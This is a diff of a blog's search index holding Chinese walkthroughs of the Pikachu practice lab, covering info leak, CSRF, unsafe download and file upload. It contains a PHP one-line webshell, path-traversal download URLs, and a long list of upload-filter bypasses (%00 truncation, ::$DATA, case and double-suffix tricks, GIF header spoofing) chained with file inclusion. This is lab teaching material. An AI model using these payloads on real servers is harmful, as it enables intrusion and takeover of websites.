+<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
+<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
+<p>成功登录</p>
+<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
+<p>并且发现，该后台为未授权接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
+
+<p>不需要登录也能访问</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-CSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
     <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
@@ -460,24 +656,6 @@
 <p>可以借助logger++插件</p>
 <p><img src="/images/image-20230112151526121.png" alt="image-20230112151526121"></p>
 <p>可以发现每一个token的值都不同</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-敏感信息泄露</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
-    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
-<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
-<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
-<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
-<p>成功登录</p>
-<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
-<p>并且发现，该后台为未授权接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
-
-<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1718,24 +1896,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
-
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-不安全的URL跳转</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
     <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
@@ -1758,112 +1918,19 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-文件上传</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
 
-<p>首先保存一个shell.php用于上传</p>
-<p>当上传时，会显示文件不符合要求</p>
-<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
-<p>其实弹窗已经可以初步判断是客户端校验了</p>
-<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
-<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
-<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
-<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
-<p>直接将其删除</p>
-<p>此时再上传就不会有任何问题</p>
-<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
-<p>蚁剑成功连接</p>
-<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
-<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
-<p>但同样为保留字符的0x80不行</p>
-<p>在文件后缀名后的hex添加一个81</p>
-<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
-<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
-<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
-<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
 
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
-
-<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
-
-<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
-
-<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
-
-<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
-<p>从而达到绕过的目的</p>
-<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
-<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
-
-<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
-
-<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
-<p>可以看到还校验了文件内容</p>
-<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<p>这是gif文件的文件头</p>
-<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
-<p>2.更改后缀为png</p>
-<p>3.更改MIME类型为image&#x2F;png</p>
-<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
-<p>成功上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
-<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
-<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
-<p>MIME是由上传文件的body的Content-Type指定的</p>
-<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
-<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
-<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
-<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
-<p>将其改为jpg或png的MIME类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
-
-<p>成功上传</p>
-<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
-<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
-<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
-
-<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
-
-<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
-
-<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
+<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
+]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
@@ -2046,6 +2113,117 @@
 
 <p><img src="/images/image-20230110105123160.png" alt="image-20230110105123160"></p>
 ]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-文件上传</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先保存一个shell.php用于上传</p>
+<p>当上传时，会显示文件不符合要求</p>
+<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
+<p>其实弹窗已经可以初步判断是客户端校验了</p>
+<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
+<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
+<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
+<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
+<p>直接将其删除</p>
+<p>此时再上传就不会有任何问题</p>
+<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
+<p>蚁剑成功连接</p>
+<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
+<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
+<p>但同样为保留字符的0x80不行</p>
+<p>在文件后缀名后的hex添加一个81</p>
+<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
+<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
+<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
+<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
+<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
+
+<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
+
+<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
+<p>从而达到绕过的目的</p>
+<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
+<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
+
+<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
+
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
+<p>可以看到还校验了文件内容</p>
+<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>这是gif文件的文件头</p>
+<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
+<p>2.更改后缀为png</p>
+<p>3.更改MIME类型为image&#x2F;png</p>
+<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
+<p>成功上传</p>
